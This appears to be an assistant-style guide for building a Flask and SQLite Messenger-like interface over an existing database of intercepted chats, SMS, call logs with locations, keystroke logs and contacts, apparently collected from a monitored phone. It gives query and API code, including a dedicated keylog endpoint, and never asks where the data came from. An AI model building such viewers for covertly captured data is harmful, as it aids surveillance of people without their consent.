To adapt the existing data in your database to a Facebook Messenger-inspired interface, we need to retrieve, organize, and present the data from your database (SQLite) effectively. Here's a step-by-step plan:


---

1. Leverage Existing Data Schema

The current schema already includes tables for ChatMessages, SMS, Calls, Keylogs, and Contacts. These tables need to work together to create the following views:

Conversations View: Combines ChatMessages and SMS, grouped by contact, showing the latest message for each contact.

Chat View: Displays all messages (from ChatMessages and SMS) between you and a selected contact, sorted by time.

Calls View: Lists call logs, grouped by contact or time.

Keylogs View: Displays keylogs associated with applications.

Contacts View: Displays a list of all saved contacts.



---

2. Key Queries for Data Retrieval

Define the database queries needed to retrieve and organize the data.

Retrieve Conversations (Grouped by Contact)

Fetch the latest message for each contact from both ChatMessages and SMS:

SELECT c.contact_id, c.name, m.text AS last_message, MAX(m.time) AS last_time
FROM Contacts c
LEFT JOIN (
    SELECT sender_contact_id AS contact_id, text, time
    FROM ChatMessages
    UNION
    SELECT sender_contact_id AS contact_id, text, time
    FROM SMS
) m ON c.contact_id = m.contact_id
GROUP BY c.contact_id
ORDER BY last_time DESC;

Retrieve Messages for a Contact

Fetch all messages for a specific contact:

SELECT text, time, sender_contact_id, recipient_contact_id
FROM ChatMessages
WHERE sender_contact_id = :contact_id OR recipient_contact_id = :contact_id
UNION
SELECT text, time, sender_contact_id, recipient_contact_id
FROM SMS
WHERE sender_contact_id = :contact_id OR recipient_contact_id = :contact_id
ORDER BY time ASC;

Retrieve Call Logs

Fetch all call logs grouped by contact:

SELECT c.name, cl.call_type, cl.time, cl.duration, cl.location
FROM Calls cl
LEFT JOIN Contacts c ON cl.caller_contact_id = c.contact_id
ORDER BY cl.time DESC;

Retrieve Keylogs

Fetch all keylogs:

SELECT k.text, k.time, i.application_name
FROM Keylogs k
LEFT JOIN InstalledApps i ON k.application = i.app_id
ORDER BY k.time DESC;

Retrieve Contacts

Fetch all contacts:

SELECT contact_id, name, phone_number, email, last_contacted
FROM Contacts
ORDER BY name ASC;


---

3. Flask Backend Integration

Modify your Flask API routes to provide endpoints for these views.

API Endpoints

Conversations API:

@app.route('/api/conversations', methods=['GET'])
def get_conversations():
    query = """
        SELECT c.contact_id, c.name, m.text AS last_message, MAX(m.time) AS last_time
        FROM Contacts c
        LEFT JOIN (
            SELECT sender_contact_id AS contact_id, text, time
            FROM ChatMessages
            UNION
            SELECT sender_contact_id AS contact_id, text, time
            FROM SMS
        ) m ON c.contact_id = m.contact_id
        GROUP BY c.contact_id
        ORDER BY last_time DESC;
    """
    result = query_database(query)
    return jsonify(result)

Messages API:

@app.route('/api/messages/<int:contact_id>', methods=['GET'])
def get_messages(contact_id):
    query = """
        SELECT text, time, sender_contact_id, recipient_contact_id
        FROM ChatMessages
        WHERE sender_contact_id = :contact_id OR recipient_contact_id = :contact_id
        UNION
        SELECT text, time, sender_contact_id, recipient_contact_id
        FROM SMS
        WHERE sender_contact_id = :contact_id OR recipient_contact_id = :contact_id
        ORDER BY time ASC;
    """
    result = query_database(query, {'contact_id': contact_id})
    return jsonify(result)

Calls API:

@app.route('/api/calls', methods=['GET'])
def get_calls():
    query = """
        SELECT c.name, cl.call_type, cl.time, cl.duration, cl.location
        FROM Calls cl
        LEFT JOIN Contacts c ON cl.caller_contact_id = c.contact_id
        ORDER BY cl.time DESC;
    """
    result = query_database(query)
    return jsonify(result)

Keylogs API:

@app.route('/api/keylogs', methods=['GET'])
def get_keylogs():
    query = """
        SELECT k.text, k.time, i.application_name
        FROM Keylogs k
        LEFT JOIN InstalledApps i ON k.application = i.app_id
        ORDER BY k.time DESC;
    """
    result = query_database(query)
    return jsonify(result)

Contacts API:

@app.route('/api/contacts', methods=['GET'])
def get_contacts():
    query = """
        SELECT contact_id, name, phone_number, email, last_contacted
        FROM Contacts
        ORDER BY name ASC;
    """
    result = query_database(query)
    return jsonify(result)



---

4. Frontend Integration

For a mobile-friendly Messenger-like UI:

Use Bootstrap or Materialize for responsive design.

Use AJAX or Fetch API to load data dynamically from Flask APIs.

Implement tabbed navigation for "Conversations", "Keylogs", "Calls", and "Contacts".


Homepage

Default view: Conversations (list of contacts with the latest message).

Tabs: Switch between Keylogs, Calls, and Contacts.


Chat View

Fetch messages for a contact using /api/messages/<contact_id>.

Display as chat bubbles with timestamps.

Use a responsive layout for mobile devices.



---

5. Deployment

Use Flask-Static for serving the frontend.

For production:

Use Gunicorn or uWSGI with Flask.

Use Nginx as a reverse proxy.


Consider adding pagination for large datasets.



---

By combining these steps, you can integrate the existing data into a modern, mobile-friendly interface while ensuring a smooth user experience.

